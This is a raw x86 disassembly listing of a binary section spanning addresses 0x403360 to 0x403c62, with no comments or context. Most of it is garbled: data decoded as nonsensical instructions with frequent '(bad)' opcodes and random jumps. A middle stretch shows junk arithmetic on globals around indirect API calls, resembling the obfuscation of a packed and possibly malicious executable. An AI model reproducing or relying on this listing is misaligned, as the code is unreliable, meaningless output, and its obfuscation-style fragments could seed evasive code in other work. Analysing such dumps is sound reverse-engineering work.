  403360:	cmc    
  403361:	add    al,0x6a
  403363:	cmp    bl,BYTE PTR [edx+0x5b]
  403366:	mov    ds:0x175e8f67,eax
  40336b:	jp     0x403318
  40336d:	sti    
  40336e:	and    esp,DWORD PTR [ebx+ebx*2-0x13a3afed]
  403375:	mov    edx,0xb98b7e68
  40337a:	add    DWORD PTR [ecx+0x49],ecx
  40337d:	cmp    al,0xb0
  40337f:	outs   dx,DWORD PTR ds:[esi]
  403380:	or     al,0x2e
  403382:	xor    DWORD PTR [ebp+0x39bd8ed5],ecx
  403388:	jge    0x40334b
  40338a:	xchg   edi,eax
  40338b:	aam    0x1c
  40338d:	mov    ah,0x41
  40338f:	jne    0x403388
  403391:	cmc    
  403392:	or     eax,0x402b2c7f
  403397:	daa    
  403398:	mov    BYTE PTR [ebp+0x51],cl
  40339b:	pop    eax
  40339c:	popf   
  40339d:	lahf   
  40339e:	rol    BYTE PTR ds:0x15686073,0xdb
  4033a5:	popf   
  4033a6:	arpl   WORD PTR [ebx+0x6e],bp
  4033a9:	loope  0x4033b1
  4033ab:	inc    BYTE PTR [esi+0x26]
  4033ae:	and    dl,BYTE PTR [ebx+0x399612c7]
  4033b4:	(bad)  
  4033b5:	rcr    BYTE PTR [eax-0x8],1
  4033b8:	push   cs
  4033b9:	push   edi
  4033ba:	test   BYTE PTR [eax],cl
  4033bc:	xor    BYTE PTR [ecx-0x2df36a60],dl
  4033c2:	mov    ebx,0x2d6deb7b
  4033c7:	popf   
  4033c8:	cmp    al,0x2
  4033ca:	xchg   esp,eax
  4033cb:	rcl    DWORD PTR [edx-0x67],1
  4033ce:	int3   
  4033cf:	adc    ch,BYTE PTR [eax+0x1b]
  4033d2:	push   ecx
  4033d3:	mov    eax,0x24e7ad3c
  4033d8:	out    0xd3,eax
  4033da:	cmp    edx,ebx
  4033dc:	jno    0x403360
  4033de:	pop    ebx
  4033df:	sti    
  4033e0:	nop
  4033e1:	in     eax,0x3d
  4033e3:	push   eax
  4033e4:	add    DWORD PTR [ecx+0x3e],esp
  4033e7:	mov    dl,0xb3
  4033e9:	xchg   edi,eax
  4033ea:	in     eax,0x73
  4033ec:	fs loopne 0x4033e1
  4033ef:	jmp    0xc11d533f
  4033f4:	sub    ah,ch
  4033f6:	fidivr WORD PTR ds:0xc766421f
  4033fd:	pushfw 
  4033ff:	das    
  403400:	xor    DWORD PTR [ecx+0x63],edx
  403403:	and    al,0x53
  403405:	jo     0x403456
  403407:	cdq    
  403408:	into   
  403409:	inc    esi
  40340a:	dec    BYTE PTR [ebx+0x4fbc1b61]
  403410:	(bad)  
  403411:	xchg   ebp,eax
  403412:	pop    edi
  403413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403414:	dec    edi
  403415:	jne    0x40347d
  403417:	mov    esp,0x2e1e4822
  40341c:	fsub   DWORD PTR [ebp+0x42]
  40341f:	cli    
  403420:	xlat   BYTE PTR ds:[ebx]
  403421:	add    eax,DWORD PTR [ebp+0x6e43b9a6]
  403427:	jl     0x4033d5
  403429:	push   ds
  40342a:	mov    ebx,0xb2485722
  40342f:	cmp    ecx,edx
  403431:	pop    es
  403432:	hlt    
  403433:	push   esi
  403434:	sub    DWORD PTR [edi-0x33],eax
  403437:	pop    eax
  403438:	dec    esp
  403439:	ror    DWORD PTR [edx+0x19],0xc2
  40343d:	or     esp,DWORD PTR [edi]
  40343f:	loop   0x4034ab
  403441:	xor    edx,DWORD PTR [esi+edx*8-0x66ae1125]
  403448:	xchg   ecx,eax
  403449:	push   eax
  40344a:	push   ebp
  40344b:	call   0x6c4eacbd
  403450:	inc    ebx
  403451:	dec    eax
  403452:	add    DWORD PTR [ebx-0x16],ebp
  403455:	push   0xffffff8e
  403457:	shl    BYTE PTR [ebx+0x68d7ffc5],0xe0
  40345e:	(bad)  
  40345f:	cs sahf 
  403461:	call   0xa8ab:0xa39bab81
  403468:	ret    
  403469:	bound  eax,QWORD PTR [ecx+0x2a]
  40346c:	(bad)  
  40346d:	data16 jbe 0x40340b
  403470:	(bad)  
  403471:	sti    
  403472:	push   ecx
  403473:	or     BYTE PTR [edx],ah
  403475:	xor    ebx,eax
  403477:	out    0xf8,al
  403479:	mov    esp,0x56156182
  40347e:	sar    BYTE PTR ds:0x12998278,1
  403484:	mov    DWORD PTR [ebx+edi*2-0x58183d2e],esi
  40348b:	leave  
  40348c:	jae    0x403429
  40348e:	daa    
  40348f:	push   esi
  403490:	or     ecx,DWORD PTR [ebp+0x517f2159]
  403496:	jge    0x4034cc
  403498:	push   ss
  403499:	fistp  DWORD PTR [ecx+0xb]
  40349c:	mov    es,ebp
  40349e:	in     al,dx
  40349f:	mov    ecx,DWORD PTR [ebx+0x5c]
  4034a2:	dec    esi
  4034a3:	mov    esp,0x2591a9a9
  4034a8:	das    
  4034a9:	jb     0x4034db
  4034ab:	in     al,0x15
  4034ad:	jle    0x403455
  4034af:	jno    0x403500
  4034b1:	xchg   esp,eax
  4034b2:	mov    bh,0xda
  4034b4:	mov    cl,0xb3
  4034b6:	cwde   
  4034b7:	(bad)  
  4034b8:	xchg   ebx,eax
  4034b9:	out    dx,al
  4034ba:	adc    al,0xc4
  4034bc:	popa   
  4034bd:	aam    0xe1
  4034bf:	dec    BYTE PTR [ebx]
  4034c1:	nop
  4034c2:	(bad)  
  4034c3:	fmul   QWORD PTR [eax]
  4034c5:	gs jae 0x4034b3
  4034c8:	jmp    0x4034ed
  4034ca:	inc    ebx
  4034cb:	sbb    edx,esi
  4034cd:	dec    edi
  4034ce:	sub    al,0xff
  4034d0:	(bad)  
  4034d1:	mov    esi,0x42ae768a
  4034d6:	iret   
  4034d7:	xor    DWORD PTR [ecx],eax
  4034d9:	dec    esi
  4034da:	push   cs
  4034db:	cld    
  4034dc:	add    al,0x7e
  4034de:	xchg   DWORD PTR [esi+edi*4],eax
  4034e1:	mov    al,ds:0xba0278d8
  4034e6:	pcmpeqd mm2,mm6
  4034e9:	cmp    DWORD PTR [ecx+0x4d8b8b3a],edx
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428163,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx-0x1],ch
  403514:	sub    eax,0xe5c36a08
  403519:	sbb    BYTE PTR [eax],bl
  40351b:	sahf   
  40351c:	adc    bl,BYTE PTR [eax]
  40351e:	sbb    dh,ah
  403520:	xchg   ecx,eax
  403521:	retf   
  403522:	sub    al,bh
  403524:	pushf  
  403525:	int3   
  403526:	js     0x40357b
  403528:	sti    
  403529:	mov    ds:0x279fde0c,al
  40352e:	sbb    ah,BYTE PTR [edi-0x52fac76e]
  403534:	jle    0x4034d5
  403536:	xchg   esi,eax
  403537:	in     eax,dx
  403538:	sti    
  403539:	psrld  mm6,mm5
  40353c:	test   eax,0x5fefec02
  403541:	add    cl,BYTE PTR [edx-0x35d0aba3]
  403547:	sub    al,0xf6
  403549:	cmp    ebx,0xf031fa34
  40354f:	(bad)  
  403550:	mov    ebp,0xe2757798
  403555:	pop    eax
  403556:	(bad)  
  403557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403558:	and    dl,dh
  40355a:	jo     0x403591
  40355c:	icebp  
  40355d:	xchg   bh,dh
  40355f:	pushf  
  403560:	xor    bh,0xef
  403563:	mov    esp,0xd6d025c1
  403568:	mov    bh,0x90
  40356a:	dec    edi
  40356b:	xchg   ebx,eax
  40356c:	dec    esi
  40356d:	pop    ss
  40356e:	xchg   BYTE PTR [eax-0xfb5e17],bl
  403574:	sub    al,0xc
  403576:	mov    ds:0x12031224,al
  40357b:	ss aad 0xc3
  40357e:	dec    edi
  40357f:	or     ah,BYTE PTR [ebp+0x75f5bf3c]
  403585:	sbb    BYTE PTR [edi+edi*4-0x10be0198],ah
  40358c:	ss fsubr st,st(2)
  40358f:	stos   DWORD PTR es:[edi],eax
  403590:	xor    eax,0x7f0d5527
  403595:	inc    ebp
  403596:	pop    es
  403597:	inc    edx
  403598:	js     0x403615
  40359a:	xor    DWORD PTR [ecx+0x87b6a05],edi
  4035a0:	ror    BYTE PTR [edx-0x28060cfa],1
  4035a6:	pop    ds
  4035a7:	out    dx,eax
  4035a8:	test   ebx,ecx
  4035aa:	cli    
  4035ab:	fxch   st(0)
  4035ad:	mov    ds:0x7b1a746a,eax
  4035b2:	ret    0xd6c9
  4035b5:	repz cs jl 0x4035c7
  4035b9:	jnp    0x40355f
  4035bb:	int3   
  4035bc:	lds    esi,FWORD PTR [ecx-0x59]
  4035bf:	fs xchg esp,eax
  4035c1:	adc    DWORD PTR [ebx],ecx
  4035c3:	and    BYTE PTR ss:[ebp-0x3096347f],dh
  4035ca:	mov    bh,0x5b
  4035cc:	jle    0x403586
  4035ce:	retf   
  4035cf:	inc    ebx
  4035d0:	push   esi
  4035d1:	push   ds
  4035d2:	sbb    BYTE PTR [ebx-0x626dba1a],0xe2
  4035d9:	xchg   BYTE PTR [eax+0x76],ch
  4035dc:	(bad)  
  4035dd:	add    al,0x4
  4035df:	jg     0x403618
  4035e1:	dec    edx
  4035e2:	dec    ebx
  4035e3:	cmp    al,0xe8
  4035e5:	push   cs
  4035e6:	mov    eax,0xeff7d4f3
  4035eb:	mov    ds:0xc773d66f,al
  4035f0:	jno    0x403604
  4035f2:	out    0x21,eax
  4035f4:	gs pop ebp
  4035f6:	or     eax,0x8ff7794b
  4035fb:	or     eax,0xc04e611d
  403600:	pop    esp
  403601:	xor    DWORD PTR [ecx],edi
  403603:	fsub   QWORD PTR [eax]
  403605:	dec    esi
  403606:	(bad)  
  403607:	xchg   esp,eax
  403608:	out    dx,al
  403609:	xchg   BYTE PTR [ebx+0x2],cl
  40360c:	ds add eax,0xe60c585d
  403612:	cld    
  403613:	dec    ecx
  403614:	and    eax,0x6b1ca1b4
  403619:	mov    ah,0x1f
  40361b:	stc    
  40361c:	sbb    BYTE PTR [ecx+esi*4-0x6a882ee8],cl
  403623:	loope  0x4035ed
  403625:	bound  esp,QWORD PTR [ebx+edi*4+0x1507ab94]
  40362c:	js     0x403680
  40362e:	ss aam 0xe
  403631:	mov    ds:0xa87d2b0,al
  403636:	add    ecx,ebx
  403638:	cmp    al,0xf0
  40363a:	push   edx
  40363b:	shr    al,1
  40363d:	test   eax,0x8a942da1
  403642:	sbb    BYTE PTR [ebx+ebp*2-0x4f],bl
  403646:	push   0xffffffea
  403648:	add    esi,DWORD PTR [edi-0x32152f4b]
  40364e:	jecxz  0x403694
  403650:	int3   
  403651:	jb     0x403618
  403653:	adc    BYTE PTR [esi+0x43ac0ff2],0xf9
  40365a:	mov    edx,0xb2f7a74b
  40365f:	mov    eax,ds:0xb974daef
  403664:	fbstp  TBYTE PTR [edi+edi*4+0xc]
  403668:	mov    edi,0x348e5428
  40366d:	or     ebx,esp
  40366f:	mov    esp,ecx
  403671:	mov    edi,0x454f005f
  403676:	mov    ebp,0xc85a696
  40367b:	cwde   
  40367c:	sub    DWORD PTR [ebp+edx*2+0x14c347cc],0x26
  403684:	fwait
  403685:	ins    DWORD PTR es:[edi],dx
  403686:	(bad)  
  403687:	test   BYTE PTR [edi-0x742bd012],dh
  40368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40368e:	mov    cl,0xdc
  403690:	dec    edx
  403691:	mov    ds:0xa6f9de2b,al
  403696:	push   ebx
  403697:	push   0xfead6944
  40369c:	xchg   ebp,eax
  40369d:	retf   
  40369e:	rcr    ebx,0x90
  4036a1:	nop
  4036a2:	mov    eax,ds:0x1ca77ad
  4036a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a8:	imul   eax,DWORD PTR [esi-0x3f],0x3990e451
  4036af:	cmp    bl,BYTE PTR [esi+0x20]
  4036b2:	push   ebp
  4036b3:	(bad)  
  4036b4:	pop    ecx
  4036b5:	inc    ebp
  4036b6:	test   DWORD PTR [ecx],edi
  4036b8:	mov    ebp,0x32a0fd5f
  4036bd:	push   ebp
  4036be:	dec    edi
  4036bf:	cld    
  4036c0:	(bad)  
  4036c1:	jne    0x40368f
  4036c3:	dec    esp
  4036c4:	jl     0x4036d2
  4036c6:	in     al,dx
  4036c7:	(bad)  
  4036c8:	jns    0x4036ac
  4036ca:	je     0x403660
  4036cc:	push   esi
  4036cd:	call   0x9ed9:0x1d26b1ff
  4036d4:	sub    al,0x5f
  4036d6:	mov    esi,DWORD PTR [edi+0x5c]
  4036d9:	mov    esi,0x86b6a909
  4036de:	inc    ebx
  4036df:	fisubr WORD PTR [ebp+ebx*8+0x36]
  4036e3:	aad    0x20
  4036e5:	ins    DWORD PTR es:[edi],dx
  4036e6:	addr16 inc ecx
  4036e8:	lods   eax,DWORD PTR ds:[esi]
  4036e9:	cmp    edi,DWORD PTR [edx+0x49]
  4036ec:	or     ah,BYTE PTR [eax-0x5a]
  4036ef:	je     0x4036b9
  4036f1:	mov    cl,0x8e
  4036f3:	lea    ebp,[ebp-0x4eee0c97]
  4036f9:	push   ebx
  4036fa:	dec    eax
  4036fb:	ja     0x4036d4
  4036fd:	ja     0x403739
  4036ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403700:	pop    es
  403701:	ret    
  403702:	and    eax,0x220292fb
  403707:	(bad)  
  403708:	jg     0x4036f5
  40370a:	mov    WORD PTR [edx+0x23],gs
  40370d:	push   eax
  40370e:	sub    al,0x1f
  403710:	or     BYTE PTR [esi+0x18ce2547],0x99
  403717:	es sub ah,0xcf
  40371b:	adc    al,0xac
  40371d:	adc    eax,0x5034d922
  403722:	das    
  403723:	inc    ebp
  403724:	gs repz mov ch,0xef
  403728:	stos   DWORD PTR es:[edi],eax
  403729:	cmp    DWORD PTR [esi],0xf69ad4b9
  40372f:	cdq    
  403730:	dec    esi
  403731:	inc    esp
  403732:	cli    
  403733:	inc    edx
  403734:	push   ebp
  403735:	push   ebx
  403736:	pop    eax
  403737:	maxps  xmm7,xmm5
  40373a:	pop    es
  40373b:	or     ch,ah
  40373d:	mov    edx,0x4a2bd047
  403742:	mov    ?,ecx
  403744:	pop    ebp
  403745:	fild   DWORD PTR [edx+0x7aa4c657]
  40374b:	cmp    eax,0x2fdd7a9a
  403750:	repnz inc ebp
  403752:	and    eax,0x73caa839
  403757:	add    eax,0x526a3de2
  40375c:	pop    ecx
  40375d:	std    
  40375e:	sub    dh,BYTE PTR [eax+eax*1]
  403761:	bound  esp,QWORD PTR [ebx+0x736c19f2]
  403767:	sbb    al,0xe
  403769:	push   ss
  40376a:	iret   
  40376b:	mov    bl,bh
  40376d:	fwait
  40376e:	aad    0xc1
  403770:	xor    DWORD PTR [eax],ecx
  403772:	push   ecx
  403773:	inc    ebx
  403774:	mov    DWORD PTR [ebp+0x7e],ecx
  403777:	stc    
  403778:	xor    eax,0xec89300e
  40377d:	sub    dh,BYTE PTR [edx-0x7958a5b5]
  403783:	jae    0x4037b7
  403785:	dec    ebp
  403786:	sar    DWORD PTR [edx-0x5816c107],cl
  40378c:	jb     0x403794
  40378e:	pop    eax
  40378f:	inc    esi
  403790:	jge    0x4037ae
  403792:	and    ch,BYTE PTR [eax-0x79]
  403795:	push   edi
  403796:	jp     0x40374d
  403798:	cli    
  403799:	xchg   edi,esi
  40379b:	xchg   bh,ah
  40379d:	repnz fs and edi,eax
  4037a1:	js     0x4037ff
  4037a3:	push   0x3a
  4037a5:	fwait
  4037a6:	cli    
  4037a7:	inc    ebx
  4037a8:	cmp    al,0xd9
  4037aa:	(bad)  
  4037ab:	not    BYTE PTR [edi]
  4037ad:	retf   0x209c
  4037b0:	outs   dx,BYTE PTR ds:[esi]
  4037b1:	xchg   ebx,eax
  4037b2:	pusha  
  4037b3:	je     0x40377d
  4037b5:	mov    esi,0xb1184aee
  4037ba:	dec    ebp
  4037bb:	daa    
  4037bc:	(bad)  
  4037bd:	jnp    0x4037a4
  4037bf:	sbb    DWORD PTR [eax+esi*1+0x71],0x762aee96
  4037c7:	dec    ebp
  4037c8:	aad    0x46
  4037ca:	push   0xb8148c1c
  4037cf:	mov    DWORD PTR [esi],esi
  4037d1:	ror    DWORD PTR [ebp+ebx*2-0x2ee7f90f],0x14
  4037d9:	pop    ecx
  4037da:	xchg   dh,ah
  4037dc:	(bad)
  4037e0:	out    0xfc,eax
  4037e2:	lea    ecx,[esi]
  4037e4:	jb     0x40378f
  4037e6:	pop    esi
  4037e7:	call   0x9e4be083
  4037ec:	pop    esp
  4037ed:	or     eax,0x4e67e6a3
  4037f2:	scas   al,BYTE PTR es:[edi]
  4037f3:	adc    bl,cl
  4037f5:	xor    ch,bh
  4037f7:	pop    ebx
  4037f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037f9:	mov    WORD PTR [eax-0x419d367b],es
  4037ff:	add    edx,ebp
  403801:	push   ebp
  403802:	or     ebp,DWORD PTR [ecx+0x64]
  403805:	xchg   ecx,eax
  403806:	(bad)  
  403807:	call   0x995ec16f
  40380c:	cmc    
  40380d:	outs   dx,DWORD PTR ds:[esi]
  40380e:	fist   WORD PTR [esi+eax*8+0x117f849b]
  403815:	xor    eax,edx
  403817:	jecxz  0x40383d
  403819:	es call 0xcecf8f0b
  40381f:	cmp    esp,ebp
  403821:	push   ebx
  403822:	jmp    0x1fdaed8f
  403827:	push   ds
  403828:	mov    edi,0xeb0a8bbf
  40382d:	add    al,0xfb
  40382f:	call   DWORD PTR ds:0x5eeb8422
  403835:	mov    ds:0xe640eb67,al
  40383a:	cmc    
  40383b:	cmp    dl,BYTE PTR [edi+ebx*4-0x623bfbd2]
  403842:	test   DWORD PTR [ecx-0x5f],ecx
  403845:	fistp  WORD PTR [ebx-0x63]
  403848:	sub    BYTE PTR [edx-0x3e00fcae],bh
  40384e:	enter  0xd03a,0x99
  403852:	inc    esi
  403853:	dec    edx
  403854:	add    eax,0xdb3d69ca
  403859:	(bad)  
  40385a:	push   ecx
  40385b:	mov    esp,0xe158dcd4
  403860:	(bad)  
  403861:	mov    ecx,0x66fb9792
  403866:	retf   
  403867:	mov    ds:0xc0713a22,eax
  40386c:	stc    
  40386d:	inc    esi
  40386e:	xor    al,0xbd
  403870:	push   esi
  403871:	addr16 call 0x132bfc58
  403877:	sub    al,BYTE PTR [ecx-0x45068af2]
  40387d:	data16 mov al,0x5f
  403880:	in     eax,dx
  403881:	or     DWORD PTR [esi],ebx
  403883:	mov    cl,0x17
  403885:	mov    ebp,0x7ca5da6f
  40388a:	dec    eax
  40388b:	jp     0x4038ee
  40388d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40388e:	int3   
  40388f:	mov    ds:0x2262d628,eax
  403894:	scas   eax,DWORD PTR es:[edi]
  403895:	shl    DWORD PTR [ebp+0x799eeb9f],1
  40389b:	jb     0x403883
  40389d:	xchg   ebp,eax
  40389e:	popa   
  40389f:	cmp    al,0xba
  4038a1:	je     0x40387f
  4038a3:	push   edi
  4038a4:	xchg   ebx,eax
  4038a5:	dec    ebx
  4038a6:	mov    ecx,DWORD PTR [esp+eiz*4]
  4038a9:	lods   eax,DWORD PTR ds:[esi]
  4038aa:	jg     0x4038f0
  4038ac:	and    al,0xae
  4038ae:	fdivr  QWORD PTR [eax-0xf]
  4038b1:	in     al,0x5
  4038b3:	cmc    
  4038b4:	test   ecx,esp
  4038b6:	pop    ss
  4038b7:	pop    eax
  4038b8:	mov    bh,0xdb
  4038ba:	dec    ecx
  4038bb:	xchg   ecx,eax
  4038bc:	(bad)  
  4038bd:	or     al,0xef
  4038bf:	(bad)  
  4038c0:	mov    dl,0x8e
  4038c2:	sub    al,0xd7
  4038c4:	out    0x15,eax
  4038c6:	es clc 
  4038c8:	jno    0x4038bf
  4038ca:	gs push ss
  4038cc:	test   eax,0x5f01df07
  4038d1:	(bad)  
  4038d2:	pusha  
  4038d3:	in     eax,0x54
  4038d5:	shl    DWORD PTR [ebx],1
  4038d7:	xchg   ebx,eax
  4038d8:	fdivr  st(0),st
  4038da:	jae    0x403911
  4038dc:	cli    
  4038dd:	adc    BYTE PTR [ebp+eax*8-0x75],dh
  4038e1:	inc    ebp
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x428263,0x0
  4038ea:	not    DWORD PTR ds:0x42815b
  4038f0:	mov    ecx,DWORD PTR ds:0x428287
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428263,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428ed8
  403913:	xor    edx,DWORD PTR ds:0x42824f
  403919:	neg    DWORD PTR ds:0x428263
  40391f:	xor    DWORD PTR ds:0x428157,0x12a5
  403929:	and    DWORD PTR ds:0x4283a7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42828b
  403939:	or     ecx,DWORD PTR ds:0x42823f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428163,0x0
  403949:	mov    DWORD PTR ds:0x4283a7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428163,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dac
  40397f:	adc    DWORD PTR ds:0x428297,0x42817f
  403989:	sbb    DWORD PTR ds:0x428283,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428383
  403999:	or     DWORD PTR ds:0x42825f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428287
  4039a7:	adc    edx,DWORD PTR ds:0x42826b
  4039ad:	mov    DWORD PTR ds:0x428287,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42823f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282a7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42829b,0x4283a7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42817b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428157,0x42831f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428163,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42815b,0x4282f3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42826f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428287,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428157,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428283,0x0
  403a3e:	mov    DWORD PTR ds:0x42830f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283a7
  403a57:	cmp    DWORD PTR ds:0x428283,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d88
  403a6f:	mov    edx,DWORD PTR ds:0x42833f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283d3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428183,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428177,0x2089
  403aa2:	or     DWORD PTR ds:0x42815b,0x113b
  403aac:	mov    eax,ds:0x4223d0
  403ab1:	cmp    DWORD PTR ds:0x428183,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42824f
  403ac3:	mov    DWORD PTR ds:0x428233,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428323,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428183,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428183,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428123
  403af8:	call   DWORD PTR ds:0x428db0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42824b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42828f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42837b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42816b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xaa596788
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x1181812],bl
  403b4b:	or     esp,DWORD PTR es:[edi]
  403b4e:	ins    BYTE PTR es:[edi],dx
  403b4f:	inc    esi
  403b50:	sti    
  403b51:	ret    
  403b52:	out    0xdf,al
  403b54:	and    DWORD PTR [eax-0x69],edx
  403b57:	std    
  403b58:	and    BYTE PTR [edi+eax*2-0x23],dh
  403b5c:	and    al,0x80
  403b5e:	jge    0x403b5d
  403b60:	popa   
  403b61:	xor    eax,0x6313c1a7
  403b66:	or     bl,BYTE PTR [edi-0x3e]
  403b69:	fadd   DWORD PTR [edx]
  403b6b:	and    al,0x38
  403b6d:	mov    ?,WORD PTR [ebx]
  403b6f:	jmp    0xa997:0xf07c9532
  403b76:	sbb    cl,BYTE PTR [eax+0x210f252d]
  403b7c:	mov    ch,bh
  403b7e:	aad    0xc6
  403b80:	sbb    bh,BYTE PTR [edx-0x49]
  403b83:	dec    edi
  403b84:	sub    eax,0x5b0eda8a
  403b89:	and    BYTE PTR cs:[eax],al
  403b8c:	mov    al,dl
  403b8e:	or     eax,0x50059ba0
  403b93:	mov    dh,0x7a
  403b95:	out    dx,al
  403b96:	out    0x97,al
  403b98:	std    
  403b99:	test   al,0x7d
  403b9b:	mov    eax,0x77e13351
  403ba0:	pop    eax
  403ba1:	in     eax,0xda
  403ba3:	ret    
  403ba4:	lods   eax,DWORD PTR ds:[esi]
  403ba5:	xor    edi,ecx
  403ba7:	dec    ebx
  403ba8:	jge    0x403bca
  403baa:	call   FWORD PTR [esi]
  403bac:	sub    eax,0x1501886f
  403bb1:	sub    dh,BYTE PTR [ebp-0x15]
  403bb4:	or     BYTE PTR [ebx],bh
  403bb6:	jnp    0x403bb0
  403bb8:	pop    esi
  403bb9:	inc    ecx
  403bba:	xchg   ecx,eax
  403bbb:	cli    
  403bbc:	xchg   edx,eax
  403bbd:	add    al,0xc2
  403bbf:	xor    edx,esi
  403bc1:	jmp    0xdd06:0x1d4779b8
  403bc8:	xor    eax,0x761f1f33
  403bcd:	xchg   esi,eax
  403bce:	push   edi
  403bcf:	loope  0x403bd6
  403bd1:	leave  
  403bd2:	adc    al,0xfa
  403bd4:	push   ebx
  403bd5:	inc    esp
  403bd6:	mov    bh,0x80
  403bd8:	jg     0x403bc6
  403bda:	out    0x52,al
  403bdc:	lods   al,BYTE PTR ds:[esi]
  403bde:	dec    edi
  403bdf:	jo     0x403c53
  403be1:	call   0xd876:0xd5eef453
  403be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403be9:	push   edi
  403bea:	jle    0x403bd1
  403bec:	cmovge esp,DWORD PTR [edi]
  403bef:	mov    cl,0xf4
  403bf1:	add    al,0xc3
  403bf3:	push   edx
  403bf4:	adc    BYTE PTR [eax+ebx*1],dl
  403bf7:	inc    ecx
  403bf8:	cmp    eax,0x7b299b04
  403bfd:	cs inc esp
  403bff:	jbe    0x403be6
  403c01:	imul   ebx,DWORD PTR [esi+0x2a6c28b],0x3efac080
  403c0b:	sub    cl,BYTE PTR [edx-0x5f]
  403c0e:	pop    ds
  403c0f:	scas   al,BYTE PTR es:[edi]
  403c10:	cwde   
  403c11:	lods   eax,DWORD PTR ds:[esi]
  403c12:	push   esi
  403c13:	call   0xf388:0x44042512
  403c1a:	shl    BYTE PTR [edi],1
  403c1c:	fdiv   DWORD PTR [eax+0x30a2f806]
  403c22:	mov    ebx,0xa8227549
  403c27:	and    BYTE PTR [ecx-0x3f79d166],cl
  403c2d:	cmp    ch,BYTE PTR [edi+0x45bfa748]
  403c33:	mov    dl,0x2a
  403c35:	dec    esp
  403c36:	add    bl,BYTE PTR [ecx+0x2f69e164]
  403c3c:	rol    ebp,cl
  403c3e:	pop    ss
  403c3f:	jle    0x403be2
  403c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c42:	(bad)  
  403c43:	popa   
  403c44:	inc    edi
  403c45:	inc    esp
  403c46:	icebp  
  403c47:	cdq    
  403c48:	inc    ebp
  403c49:	mov    ebp,0x381f0b7d
  403c4e:	jmp    0xac402ca8
  403c53:	sub    esp,DWORD PTR [eax+0x5cb426c]
  403c59:	xor    BYTE PTR [esi+0x51],ah
  403c5c:	cmp    eax,0x4fed1bfa
  403c61:	(bad)  
  403c62:	jne    0x403be8
